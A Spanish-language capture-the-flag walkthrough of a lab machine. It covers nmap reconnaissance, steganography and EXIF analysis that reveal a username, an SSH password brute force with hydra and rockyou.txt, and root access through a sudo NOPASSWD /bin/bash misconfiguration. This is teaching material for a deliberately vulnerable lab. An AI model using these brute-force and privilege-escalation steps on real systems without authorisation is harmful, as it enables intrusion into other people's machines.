# BorazuwahCTF
## 1. Reconocimiento Inicial con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones.

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados:**

- `22/tcp open ssh OpenSSH 9.2p1 Debian`: Servicio de acceso remoto seguro.
- `80/tcp open http Apache httpd 2.4.59 ((Debian))`: Servidor web Apache.

## 2. Enumeración Web y Esteganografía

Al acceder a la dirección IP en el navegador (`http://<IP_DEL_OBJETIVO>`), encontramos una página simple que muestra una imagen (huevo Kinder). En competiciones CTF, esto es un indicador fuerte de esteganografía.

### 2.1. Descarga de la Imagen

Descargamos el recurso para su análisis local utilizando `wget`.

```bash
wget http://<IP_DEL_OBJETIVO>/imagen.jpeg
```

### 2.2. Análisis con Steghide

Utilizamos `steghide` para verificar si existe información oculta incrustada en la imagen. Probamos una extracción sin contraseña (o contraseña vacía).

```bash
steghide extract -sf imagen.jpeg
# solicita contraseña, probamos ENTER (vacía)
```

Al leer el archivo extraído, encontramos el siguiente mensaje:

> "Sigue buscando, aquí no está tu solución aunque te dejo una pista.... sigue buscando en la imagen!!!"

### 2.3. Análisis de Metadatos con ExifTool

Siguiendo la pista de "seguir buscando en la imagen", analizamos los metadatos EXIF, donde a menudo se esconden comentarios o descripciones.

```bash
exiftool imagen.jpeg
```

**Resultado Relevante:**

Entre la salida de metadatos, identificamos campos modificados intencionalmente:

- `Description: ---------- User: borazuwarah ----------`
- `Title: ---------- Password: ----------`

Hemos obtenido un nombre de usuario válido: **borazuwarah**. El campo de contraseña está vacío, lo que sugiere que debemos obtenerla por otros medios.

## 3. Acceso Inicial (SSH)

Contando con un usuario válido (`borazuwarah`) y el servicio SSH expuesto, procedemos a realizar un ataque de fuerza bruta, dado que no obtuvimos la contraseña en la imagen.

### 3.1. Fuerza Bruta con Hydra

Ejecutamos `hydra` utilizando el diccionario `rockyou.txt`.

```bash
hydra -l borazuwarah -P /path/to/wordlist/rockyou.txt ssh://<IP_DEL_OBJETIVO> -t 4
```

**Resultado:**

```bash
[22][ssh] host: <IP_DEL_OBJETIVO>   login: borazuwarah   password: 123456
```

La herramienta ha encontrado la contraseña: **123456**.

### 3.2. Conexión SSH

Establecemos la conexión con las credenciales obtenidas.

```bash
ssh borazuwarah@<IP_DEL_OBJETIVO>
# Password: 123456
```

## 4. Escalada de Privilegios

### 4.1. Enumeración de Permisos Sudo

Una vez dentro del sistema, verificamos los privilegios del usuario actual revisando el archivo `sudoers` con el comando `sudo -l`.

```bash
sudo -l
```

**Salida:**

```
User borazuwarah may run the following commands on ...:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

El usuario tiene permisos excesivos. La directiva `(ALL) NOPASSWD: /bin/bash` indica que `borazuwarah` puede ejecutar una shell bash con los privilegios de cualquier usuario (incluido root) sin confirmar su contraseña.

### 4.2. Obtención de Shell de Root

Explotamos esta mala configuración ejecutando `/bin/bash` con privilegios de superusuario.

```bash
sudo /bin/bash
# O alternativamente: sudo -u root /bin/bash
```

Confirmamos la escalada exitosa:

```bash
whoami
# root
```
